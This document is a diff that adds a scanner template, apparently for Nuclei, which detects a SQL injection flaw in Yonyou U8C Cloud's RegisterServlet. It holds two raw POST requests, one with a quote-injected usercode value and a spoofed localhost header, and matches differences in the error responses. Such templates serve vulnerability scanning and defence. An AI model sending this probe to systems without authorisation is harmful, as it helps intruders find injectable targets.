@@ -1,0 +1,37 @@
+http:
+    - matchers:
+        - dsl:
+            - status_code_2 == 200 && contains_all(body_2,'Error:') && status_code_1 == 200 && contains_all(body_1,'null') && !contains_all(body_2,'null')
+          type: dsl
+      raw:
+        - |
+          POST /servlet/RegisterServlet HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36
+          Connection: close
+          Accept: */*
+          Accept-Language: en
+          Content-Type: application/x-www-form-urlencoded
+          X-Forwarded-For: 127.0.0.1
+
+          usercode=123456
+        - |
+          POST /servlet/RegisterServlet HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36
+          Connection: close
+          Accept: */*
+          Accept-Language: en
+          Content-Type: application/x-www-form-urlencoded
+          X-Forwarded-For: 127.0.0.1
+
+          usercode=123456'
+id: yonyou-u8c-registerservlet-sqli
+info:
+    author: SleepingBag945
+    name: 用友U8C Cloud RegisterServlet SQL注入
+    severity: high
+    tags:
+        - 用友u8
+        - Servlet
+        - 用友U8
